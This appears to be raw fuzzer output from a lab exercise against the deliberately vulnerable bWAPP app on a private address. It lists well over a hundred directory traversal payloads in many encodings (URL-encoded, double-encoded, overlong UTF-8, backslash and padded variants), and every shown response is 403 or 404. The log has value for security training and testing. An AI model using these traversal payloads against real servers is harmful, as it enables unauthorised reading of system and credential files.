522,403,10L,37W,http://10.0.2.4/bWAPP//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\{FILE}
526,403,10L,37W,http://10.0.2.4/bWAPP//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\{FILE}
525,403,10L,37W,http://10.0.2.4/bWAPP//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\{FILE}
527,403,10L,37W,http://10.0.2.4/bWAPP//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\..\{FILE}
524,403,10L,37W,http://10.0.2.4/bWAPP//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\{FILE}
810,403,10L,37W,http://10.0.2.4/bWAPP//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\{FILE}
808,403,10L,37W,http://10.0.2.4/bWAPP//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\{FILE}
812,403,10L,37W,http://10.0.2.4/bWAPP//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\{FILE}
809,403,10L,37W,http://10.0.2.4/bWAPP//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\{FILE}
811,403,10L,37W,http://10.0.2.4/bWAPP//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\{FILE}
813,403,10L,37W,http://10.0.2.4/bWAPP//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\{FILE}
815,403,10L,37W,http://10.0.2.4/bWAPP//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\..\{FILE}
814,403,10L,37W,http://10.0.2.4/bWAPP//.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\{FILE}
14,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
15,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
16,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
17,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e/{FILE}
18,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/{FILE}
25,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f{FILE}
26,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f{FILE}
27,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
28,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
11,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f{FILE}
29,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
30,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
9,404,9L,39W,http://10.0.2.4/bWAPP//..%2f{FILE}
10,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f{FILE}
12,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f{FILE}
13,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f{FILE}
1,404,9L,39W,http://10.0.2.4/bWAPP//../{FILE}
2,404,9L,39W,http://10.0.2.4/bWAPP//../../{FILE}
31,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
32,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
33,404,9L,39W,http://10.0.2.4/bWAPP//..%252f{FILE}
34,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f{FILE}
35,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f{FILE}
36,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f{FILE}
37,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f{FILE}
38,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
42,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/{FILE}
40,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
39,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
41,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/{FILE}
43,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/{FILE}
44,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
46,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
45,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
48,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
47,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
52,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
49,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f{FILE}
51,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
50,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f{FILE}
56,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
53,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
55,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
57,404,9L,39W,http://10.0.2.4/bWAPP//..\{FILE}
54,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
58,404,9L,39W,http://10.0.2.4/bWAPP//..\..\{FILE}
60,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\{FILE}
59,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\{FILE}
65,404,9L,39W,http://10.0.2.4/bWAPP//..%255c{FILE}
64,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\..\..\..\{FILE}
61,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\{FILE}
62,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\..\{FILE}
63,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\..\..\{FILE}
69,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c{FILE}
66,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c{FILE}
68,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c{FILE}
67,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c{FILE}
70,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
71,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
73,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c{FILE}
72,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
76,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c{FILE}
77,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
78,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
74,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c{FILE}
75,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c{FILE}
80,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\{FILE}
82,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\{FILE}
79,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
85,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
83,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
84,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
81,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\{FILE}
86,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
87,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
89,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c{FILE}
88,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c{FILE}
90,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
91,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
92,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
94,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
93,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
96,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\{FILE}
97,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\{FILE}
95,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
99,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
98,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\{FILE}
100,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
101,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
102,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
104,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c{FILE}
103,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
105,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c{FILE}
108,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
107,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
109,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
106,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
110,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
111,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
113,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%af..%c0%af{FILE}
112,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%af{FILE}
115,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
114,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%af..%c0%af..%c0%af{FILE}
117,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
116,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
118,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
119,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
120,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae/{FILE}
123,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
122,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
121,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
126,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
124,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
125,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
128,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c0%af{FILE}
127,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
133,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
129,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
132,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
130,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
131,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
136,404,9L,39W,http://10.0.2.4/bWAPP//..%25c0%25af{FILE}
135,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
137,404,9L,39W,http://10.0.2.4/bWAPP//..%25c0%25af..%25c0%25af{FILE}
134,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
138,404,9L,39W,http://10.0.2.4/bWAPP//..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
139,404,9L,39W,http://10.0.2.4/bWAPP//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
140,404,9L,39W,http://10.0.2.4/bWAPP//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
142,404,9L,39W,http://10.0.2.4/bWAPP//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
141,404,9L,39W,http://10.0.2.4/bWAPP//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
143,404,9L,39W,http://10.0.2.4/bWAPP//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
144,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae/{FILE}
145,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
147,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
146,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
152,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c0%25af{FILE}
149,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
154,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
150,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
151,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
153,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
148,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
155,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
